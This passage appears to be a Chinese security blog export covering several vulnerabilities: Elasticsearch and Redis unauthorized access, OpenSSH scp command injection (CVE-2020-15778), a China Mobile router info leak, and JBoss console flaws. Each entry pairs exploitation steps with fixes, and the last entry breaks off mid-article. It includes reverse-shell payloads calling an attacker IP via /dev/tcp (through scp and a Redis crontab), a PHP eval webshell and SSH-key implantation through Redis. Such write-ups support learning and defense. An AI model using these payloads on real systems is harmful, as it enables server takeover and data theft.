    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
<p>返回内容包含<code>You Know,for Search</code></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_cat</span><br><span class="line">/_cat/allocation</span><br><span class="line">/_cat/shards</span><br><span class="line">/_cat/shards/&#123;index&#125;</span><br><span class="line">/_cat/master</span><br><span class="line">/_cat/nodes</span><br><span class="line">/_cat/tasks</span><br><span class="line">/_cat/indices</span><br><span class="line">/_cat/indices/&#123;index&#125;</span><br><span class="line">/_cat/segments</span><br><span class="line">/_cat/segments/&#123;index&#125;</span><br><span class="line">/_cat/count</span><br><span class="line">/_cat/count/&#123;index&#125;</span><br><span class="line">/_cat/recovery</span><br><span class="line">/_cat/recovery/&#123;index&#125;</span><br><span class="line">/_cat/health</span><br><span class="line">/_cat/pending_tasks</span><br><span class="line">/_cat/aliases</span><br><span class="line">/_cat/aliases/&#123;alias&#125;</span><br><span class="line">/_cat/thread_pool</span><br><span class="line">/_cat/thread_pool/&#123;thread_pools&#125;</span><br><span class="line">/_cat/plugins</span><br><span class="line">/_cat/fielddata</span><br><span class="line">/_cat/fielddata/&#123;fields&#125;</span><br><span class="line">/_cat/nodeattrs</span><br><span class="line">/_cat/repositories</span><br><span class="line">/_cat/snapshots/&#123;repository&#125;</span><br><span class="line">/_cat/templates</span><br><span class="line">/_cat/ml/anomaly_detectors</span><br><span class="line">/_cat/ml/anomaly_detectors/&#123;job_id&#125;</span><br><span class="line">/_cat/ml/trained_models</span><br><span class="line">/_cat/ml/trained_models/&#123;model_id&#125;</span><br><span class="line">/_cat/ml/datafeeds</span><br><span class="line">/_cat/ml/datafeeds/&#123;datafeed_id&#125;</span><br><span class="line">/_cat/ml/data_frame/analytics</span><br><span class="line">/_cat/ml/data_frame/analytics/&#123;id&#125;</span><br><span class="line">/_cat/transforms</span><br><span class="line">/_cat/transforms/&#123;transform_id&#125;</span><br><span class="line">/_river/_searc</span><br><span class="line">/_river/_search 查看数据库敏感信息</span><br><span class="line">/_nodes 查看节点数据</span><br><span class="line">/_plugin/head/  如有安装head插件 web管理界面</span><br><span class="line">/_search?pretty=true 查询所有index,type</span><br><span class="line">/index/_search	查询某个index下所有type</span><br><span class="line">/index/type/_search?pretty=true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>



<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
<p>2.禁止外网访问</p>
<p>3.认证插件安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/elasticsearch/plugins/http-basic  //es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https://github.com/Asquera/elasticsearch-http-basic/releases/download/v1.1.0/elasticsearch-http-basic-1.1.0.jar  //下载es认证插件</span><br></pre></td></tr></table></figure>

<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">配置名</th>
<th align="center">默认值</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http.basic.enabled</td>
<td align="center">true</td>
<td align="center">开关，开启会接管全部HTTP连接</td>
</tr>
<tr>
<td align="center">http.basic.user</td>
<td align="center">“admin”</td>
<td align="center">账号</td>
</tr>
<tr>
<td align="center">http.basic.password</td>
<td align="center">“admin”</td>
<td align="center">密码</td>
</tr>
<tr>
<td align="center">http.basic.ipwhitelist</td>
<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
</tr>
<tr>
<td align="center">http.basic.trusted_proxy_chains</td>
<td align="center">[“172.16.18.114”]</td>
<td align="center">信任代理列表</td>
</tr>
<tr>
<td align="center">http.basic.log</td>
<td align="center">false</td>
<td align="center">把无授权的访问事件添加到ES的日志</td>
</tr>
<tr>
<td align="center">http.basic.xforward</td>
<td align="center">“X-Forwarded-For”</td>
<td align="center">记载代理路径的header字段名</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>常规漏洞</category>
        <category>Elasticsearch</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
    <url>//b5e4a9195b88.html</url>
    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
<li>Openssh &lt;= 8.3p1</li>
</ul>
<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
<li>Openssh &lt;= 8.3p1</li>
<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
<li>知道SSH密码</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#x27;`pwd` /home&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>



<p>靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#x27;`bash -i &gt;&amp; /dev/tcp/192.168.0.1/8432 0&gt;&amp;1` /home/test.txt&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
<p>使用rsync代替scp</p>
<p>官方暂无补丁</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>命令注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 未授权访问漏洞</title>
    <url>//fb3d18df70f1.html</url>
    <content><![CDATA[<h2 id="Redis-简介"><a href="#Redis-简介" class="headerlink" title="Redis 简介"></a>Redis 简介</h2><p>​    Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</p>
<h2 id="服务特征"><a href="#服务特征" class="headerlink" title="服务特征"></a>服务特征</h2><p>常见端口：6379</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>下载</strong></p>
<p>官方（Linux版本）：<a href="https://redis.io/download">https://redis.io/download</a></p>
<p>中文版官方（Linux版本）：<a href="http://www.redis.cn/download.html">http://www.redis.cn/download.html</a></p>
<p>Windows版：<a href="https://github.com/MicrosoftArchive/redis/releases">https://github.com/MicrosoftArchive/redis/releases</a></p>
<p><strong>启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows</span><br><span class="line"># 启动服务</span><br><span class="line">redis-server redis.windows.conf</span><br><span class="line"># 启动Redis</span><br><span class="line">redis-cli.exe -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux通用</span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</span><br><span class="line">tar –xvf redis-4.0.8.tar.gz</span><br><span class="line">cd redis-4.0.8</span><br><span class="line"># 编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">./src/redis-server redis.conf</span><br><span class="line"># 启动Redis</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br><span class="line">./redis-cli -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br></pre></td></tr></table></figure>



<p><strong>配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./src/redis.conf</span><br><span class="line"></span><br><span class="line">#bind 127.0.0.1  //注释掉，意思是仅本地访问</span><br><span class="line">protected-mode no    //非保护模式</span><br><span class="line">daemonize yes    //进程守护，后台运行</span><br></pre></td></tr></table></figure>



<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info			# 查看信息</span><br><span class="line">flushall		# 删除所有数据库内容</span><br><span class="line">flushdb			# 刷新数据库</span><br><span class="line">KEYS * 			# 查看所有键，使用 select num 可以查看键值数据</span><br><span class="line">config set dir dirpath			# 设置路径等配置</span><br><span class="line">config set dbfilename name		# 建立文件</span><br><span class="line">set test &quot;xxx&quot;		# 设置变量</span><br><span class="line">save				# 保存</span><br><span class="line">get 变量				# 查看变量名称</span><br></pre></td></tr></table></figure>



<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，如果Redis以root身份运行，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>​    Redis因配置不当可以未授权访问（窃取数据、反弹shell、数据备份操作主从复制、命令执行）。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Redis 2.x</li>
<li>Redis 3.x</li>
<li>Redis 4.x</li>
<li>Redis 5.x</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="redis写入ssh公钥，获取操作系统权限"><a href="#redis写入ssh公钥，获取操作系统权限" class="headerlink" title="redis写入ssh公钥，获取操作系统权限"></a>redis写入ssh公钥，获取操作系统权限</h3><p>​        利用了redis数据库的备份功能，当redis以root身份运行，利用Redis的config set命令，只要内容为SSH公钥内容，文件路径满足公钥存放的位置，就可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</p>
<p>利用条件：</p>
<ul>
<li>Root 权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在本地创建公钥文件</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到存储公钥的目录，在创建的时候会提示路径</span></span><br><span class="line">cd /root/.ssh</span><br><span class="line">cd /home/kali/.ssh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将生成的公钥文件导入txt</span></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rea.pub; echo -e &quot;\n\n&quot;)&gt;key.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把key.txt文件内容写入目标主机的缓冲里</span></span><br><span class="line">cat /home/kali/.ssh/key.txt | ./redis-cli -h 127.0.0.1 -p 6379 -x set xxx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改文件路径</span></span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用SSH连接</span></span><br><span class="line">ssh -i id_rsa root@127.0.0.1</span><br></pre></td></tr></table></figure>



<h3 id="在Web目录中写webshell"><a href="#在Web目录中写webshell" class="headerlink" title="在Web目录中写webshell"></a>在Web目录中写webshell</h3><p>​        利用了redis数据库的备份功能，在知道了网站路径以后，使用redis的CONFIG set命令，将文件内容为一句话木马，文件路径为网站根目录的wenshell写入目标服务器。</p>
<p>利用条件：</p>
<ul>
<li>成功连接到Redis</li>
<li>知道Web路径</li>
<li>具有文件读写权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir /home</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php eval($_POST[admin]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><p>利用条件：</p>
<ul>
<li>具有写入权限</li>
<li>只能在centos上使用</li>
</ul>
<p>Ubuntu权限必须是600才会执行，而redis写文件的权限是644</p>
<p>redis保存RDB会存在乱码，在Ubuntu上会报错</p>
<p>端口监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>连接redis，写入shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">config set dir</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line"><span class="meta">#</span><span class="bash"> config <span class="built_in">set</span> dir /var/spool/cron/crontabs</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> config <span class="built_in">set</span> dir /etc/</span></span><br><span class="line">config set dbfilename shellcrontab</span><br><span class="line">set shell &quot;\n\n/* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br><span class="line"><span class="meta">#</span><span class="bash"> 星号代表每分钟执行一次</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>禁止外部网络访问Redis服务端</li>
<li>禁止使用root权限启动Redis服务</li>
<li>配置安全策略，限制连接Redis服务的IP</li>
<li>修改redis.conf文件，禁止高危命令或者改变高危命令的名称</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>常规漏洞</category>
        <category>Redis数据库</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title>中国移动-禹路由 ExportSettings.sh 敏感信息泄露漏</title>
    <url>//f0a3ef61fe99.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>中国移动 禹路由 <code>ExportSettings.sh</code> 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;互联世界 物联未来-登录&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cgi-bin/ExportSettings.sh</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5pozofyvj612v0e00y402.jpg" alt="中国移动禹路由敏感信息泄露漏洞.png"></p>
<p>存在账号密码等敏感信息</p>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><p>禁止外部访问<code>ExportSettings.sh</code>文件</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>网络设备漏洞</category>
        <category>中国移动</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss Administration Console弱口令</title>
    <url>//da2c39cb4a8f.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>

<p>该页面存在默认口令<code>admin:admin</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss DeploymentFileRepository目录遍历漏洞 - CVE-2006-5750</title>
    <url>//238965db204a.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss 应用服务器 (jbossas) 3.2.4 到 4.0.5 中 <code>DeploymentFileRepository</code> 类中的目录遍历漏洞允许远程认证用户通过与控制台管理器相关的未指定向量读取或修改任意文件，并可能执行任意代码。</p>
<p><code>org.jboss.console.manager.DeploymentFileRepository</code> 类的 <code>setBaseDir()</code> 方法不检查是否通过目录遍历将 <code>basedir</code> 设置为应用程序根目录之外的目录。结合<br>使用 <code>store()</code> 和 <code>remove()</code> 方法，可以<br>在目标系统上创建和删除任意文件。</p>
<p>该类由 JBoss Web 服务器的 <code>web-console/jmx-console</code>使用，默认情况下，未经身份验证的<br>用户可以从远程访问它。在我们的研究过程中，可以创建和执行 JSP 文件并覆盖配置文件。</p>
<p>该类也可能被其他 JBoss 应用程序使用，从而使它们容易受到相同的攻击。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>JBoss 3.2.5 ~ 4.0.5</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

